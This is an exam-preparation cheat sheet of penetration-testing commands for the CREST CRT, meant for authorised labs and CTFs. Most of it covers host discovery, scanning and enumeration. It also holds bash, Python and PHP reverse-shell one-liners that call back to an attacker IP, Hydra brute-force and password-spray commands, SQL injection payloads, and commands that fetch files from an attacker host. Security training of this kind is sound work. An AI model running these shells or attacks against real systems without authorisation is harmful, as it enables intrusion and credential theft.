# CREST CRT Useful Commands Cheat Sheet

> Use only in authorised labs, exams, CTFs, or systems you have explicit permission to test.

---

## 1. Host Discovery

### Ping sweep

```bash
fping -a -g 10.0.1.0/24 2>/dev/null
```

```bash
nmap -sn 10.0.1.0/24
```

### ARP discovery

```bash
arp-scan -l
```

```bash
netdiscover -r 10.0.1.0/24
```

---

## 2. Port Scanning

### Quick TCP scan

```bash
nmap -sV -sC <target>
```

### Full TCP port scan

```bash
nmap -p- --min-rate 5000 -oN full-tcp.txt <target>
```

### Scan discovered ports in detail

```bash
nmap -sV -sC -p <ports> -oN detailed.txt <target>
```

### UDP top ports

```bash
nmap -sU --top-ports 100 <target>
```

### Aggressive scan

```bash
nmap -A <target>
```

---

## 3. DNS and Hostname Enumeration

### DNS lookup

```bash
nslookup <host>
```

```bash
dig <host>
```

### Reverse DNS lookup

```bash
dig -x <ip>
```

### Zone transfer test

```bash
dig axfr @<dns-server> <domain>
```

---

## 4. NetBIOS and SMB Enumeration

### NetBIOS scan

```bash
nbtscan <target-range>
```

```bash
nmblookup -A <ip>
```

### List SMB shares anonymously

```bash
smbclient -L //<ip> -N
```

### Connect to an SMB share

```bash
smbclient //<ip>/<share> -N
```

```bash
smbclient //<ip>/<share> -U <username>
```

### SMB enumeration

```bash
enum4linux-ng <ip>
```

```bash
smbmap -H <ip>
```

```bash
smbmap -H <ip> -u <user> -p <password>
```

### RPC anonymous login

```bash
rpcclient -U "" -N <ip>
```

Useful `rpcclient` commands:

```bash
enumdomusers
enumdomgroups
querydominfo
srvinfo
netshareenumall
```

---

## 5. User Enumeration

### SMB user enumeration

```bash
enum4linux-ng <ip>
```

```bash
rpcclient -U "" -N <ip> -c "enumdomusers"
```

### SMTP user enumeration

```bash
smtp-user-enum -M VRFY -U wordlist.txt -t <ip>
```

```bash
smtp-user-enum -M EXPN -U wordlist.txt -t <ip>
```

### Kerberos user enumeration

```bash
kerbrute userenum -d <domain> wordlist.txt --dc <dc-ip>
```

### Finger user enumeration

```bash
finger <user>@<ip>
```

---

## 6. Password Attacks

### Hydra SSH

```bash
hydra -L users.txt -P passwords.txt ssh://<ip>
```

### Hydra FTP

```bash
hydra -L users.txt -P passwords.txt ftp://<ip>
```

### Hydra HTTP POST form

```bash
hydra -L users.txt -P passwords.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### NetExec SMB password spray

```bash
netexec smb <ip> -u users.txt -p passwords.txt
```

```bash
netexec smb <ip> -u <user> -p <password> --shares
```

---

## 7. Web Enumeration

### Identify web technology

```bash
whatweb http://<ip>:<port>
```

```bash
curl -i http://<ip>:<port>
```

### Directory brute force with Gobuster

```bash
gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt
```

### Directory brute force with FFUF

```bash
ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### File extension fuzzing

```bash
ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak
```

### Check common web vulnerabilities

```bash
nikto -h http://<ip>:<port>
```

### View page source

```bash
curl http://<ip>:<port>
```

### Download a file

```bash
wget http://<ip>:<port>/<file>
```

```bash
curl -O http://<ip>:<port>/<file>
```

---

## 8. Web Login Testing

### Basic request inspection

```bash
curl -i http://<ip>:<port>/login
```

### Send POST request

```bash
curl -i -X POST http://<ip>:<port>/login \
  -d "username=admin&password=admin"
```

### Include cookies

```bash
curl -i http://<ip>:<port>/admin \
  -H "Cookie: session=<value>"
```

### SQL injection quick tests

```text
'
"
' OR '1'='1
admin'--
' OR 1=1--
```

### SQLMap basic usage

```bash
sqlmap -u "http://<ip>:<port>/page?id=1"
```

```bash
sqlmap -u "http://<ip>:<port>/login" --forms --batch
```

---

## 9. Exploit Research

### Search local Exploit-DB

```bash
searchsploit <service>
```

```bash
searchsploit <service> <version>
```

### Copy exploit locally

```bash
searchsploit -m <exploit-id>
```

### Start Metasploit

```bash
msfconsole
```

### Search in Metasploit

```text
search <service>
use <module>
show options
set RHOSTS <target>
set RPORT <port>
run
```

---

## 10. Reverse Shells

### Netcat listener

```bash
nc -lvnp 4444
```

### Bash reverse shell

```bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
```

### Python reverse shell

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP reverse shell one-liner

```bash
php -r '$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 11. Shell Stabilisation

### Upgrade shell with Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text
Ctrl+Z
```

On your attacker machine:

```bash
stty raw -echo; fg
```

Then in the shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

---

## 12. File Searching

### Find files by name

```bash
find / -iname "*trophy*" 2>/dev/null
```

```bash
find / -iname "*secret*" 2>/dev/null
```

```bash
find / -iname "*zenicarna*" 2>/dev/null
```

### Search for trophy values

```bash
grep -R "trophy-" / 2>/dev/null
```

```bash
grep -R "trophy-" /home 2>/dev/null
```

### Search readable files

```bash
find / -type f -readable 2>/dev/null
```

### Search recently modified files

```bash
find / -type f -mtime -7 2>/dev/null
```

### Identify file type

```bash
file <filename>
```

### Extract readable strings

```bash
strings <filename>
```

---

## 13. Linux Privilege Enumeration

### Current user

```bash
whoami
id
hostname
```

### System info

```bash
uname -a
cat /etc/os-release
```

### Sudo permissions

```bash
sudo -l
```

### SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Writable directories

```bash
find / -writable -type d 2>/dev/null
```

### Interesting files

```bash
ls -la /home
ls -la /root
cat /etc/passwd
cat /etc/crontab
```

### Running processes

```bash
ps aux
```

### Listening ports

```bash
ss -tulpen
```

```bash
netstat -tulpen
```

---

## 14. Windows Enumeration

### Current user

```cmd
whoami
whoami /priv
whoami /groups
hostname
```

### System info

```cmd
systeminfo
```

### Users and groups

```cmd
net user
net localgroup
net localgroup administrators
```

### Network info

```cmd
ipconfig /all
route print
netstat -ano
```

### Search for files

```cmd
dir C:\*trophy* /s /b
```

```cmd
dir C:\*secret* /s /b
```

```cmd
dir C:\*zenicarna* /s /b
```

### Search inside files

```cmd
findstr /si "trophy-" C:\*.txt
```

### PowerShell file search

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*trophy*"
```

```powershell
Select-String -Path C:\* -Pattern "trophy-" -Recurse -ErrorAction SilentlyContinue
```

---

## 15. File Transfer

### Python HTTP server on attacker machine

```bash
python3 -m http.server 8000
```

### Download using wget

```bash
wget http://<your-ip>:8000/<file>
```

### Download using curl

```bash
curl -O http://<your-ip>:8000/<file>
```

### Download with PowerShell

```powershell
iwr http://<your-ip>:8000/<file> -OutFile <file>
```

```powershell
Invoke-WebRequest http://<your-ip>:8000/<file> -OutFile <file>
```

### Netcat file transfer

On receiving machine:

```bash
nc -lvnp 9001 > file.out
```

On sending machine:

```bash
nc <target-ip> 9001 < file.in
```

---

## 16. Routing

### Show routes

```bash
ip route
```

```bash
route -n
```

### Add route to a network

```bash
sudo ip route add 172.20.31.0/24 via 172.17.89.254
```

### Add route to a single host

```bash
sudo ip route add 172.20.31.10 via 172.17.89.254
```

### Delete route

```bash
sudo ip route del 172.20.31.0/24
```

### Test route

```bash
ping 172.20.31.10
```

```bash
traceroute 172.20.31.10
```

---

## 17. Telnet and Banner Grabbing

### Connect with Telnet

```bash
telnet <ip> <port>
```

### Connect with Netcat

```bash
nc -nv <ip> <port>
```

### Grab HTTP banner

```bash
curl -i http://<ip>:<port>
```

### Nmap banner script

```bash
nmap -sV --script=banner -p <port> <ip>
```

---

## 18. Pivoting and Proxying

### SSH local port forward

```bash
ssh -L 8080:<target-ip>:80 <user>@<pivot-ip>
```

### SSH dynamic SOCKS proxy

```bash
ssh -D 1080 <user>@<pivot-ip>
```

### Use proxychains

```bash
proxychains nmap -sT -Pn <target>
```

```bash
proxychains curl http://<target>
```

### Chisel server on attacker

```bash
chisel server -p 8000 --reverse
```

### Chisel client on target

```bash
chisel client <your-ip>:8000 R:socks
```

---

## 19. Wordlist Handling

### Sort and remove duplicates

```bash
sort wordlist.txt | uniq > sorted.txt
```

### Compare two files

```bash
comm -12 <(sort file1.txt) <(sort file2.txt)
```

### Grep exact match

```bash
grep -Fxf users.txt wordlist.txt
```

### Count lines

```bash
wc -l wordlist.txt
```

### Extract usernames from enum output

```bash
grep -i "user" enum.txt
```

---

## 20. Useful One-Liners

### Find trophy files

```bash
find / -iname "*trophy*" -o -iname "*secret*" 2>/dev/null
```

### Find trophy text

```bash
grep -R "trophy-" / 2>/dev/null
```

### Scan then enumerate SMB

```bash
nmap -p 139,445 -sV -sC <ip> && enum4linux-ng <ip>
```

### Quick web enum

```bash
whatweb http://<ip>:<port> && gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt
```

### Quick service check

```bash
nc -nv <ip> <port>
```

### Start listener

```bash
nc -lvnp 4444
```

---

## 21. Common Wordlists

```bash
/usr/share/wordlists/dirb/common.txt
```

```bash
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
/usr/share/seclists/Discovery/Web-Content/common.txt
```

```bash
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```bash
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

```bash
/usr/share/wordlists/rockyou.txt.gz
```

Unzip RockYou:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## 22. Exam-Style Workflow

### 1. Discover

```bash
nmap -sn <range>
```

### 2. Scan

```bash
nmap -p- --min-rate 5000 <ip>
```

### 3. Enumerate

```bash
nmap -sV -sC -p <ports> <ip>
```

### 4. Research

```bash
searchsploit <service> <version>
```

### 5. Exploit

```bash
msfconsole
```

or use a manual exploit.

### 6. Search for trophy

```bash
find / -iname "*trophy*" -o -iname "*secret*" 2>/dev/null
grep -R "trophy-" / 2>/dev/null
```

---

## 23. Notes

Always record:

```text
Target IP
Open ports
Service versions
Valid usernames
Credentials found
Interesting shares
Interesting web paths
Trophy location
Trophy value
```

Suggested folder layout:

```bash
mkdir -p ~/crt-lab/<target>/{scans,loot,exploits,notes}
```

Example:

```bash
mkdir -p ~/crt-lab/10.0.1.27/{scans,loot,exploits,notes}
```

Save scans:

```bash
nmap -sV -sC -oN scans/basic.txt <target>
```
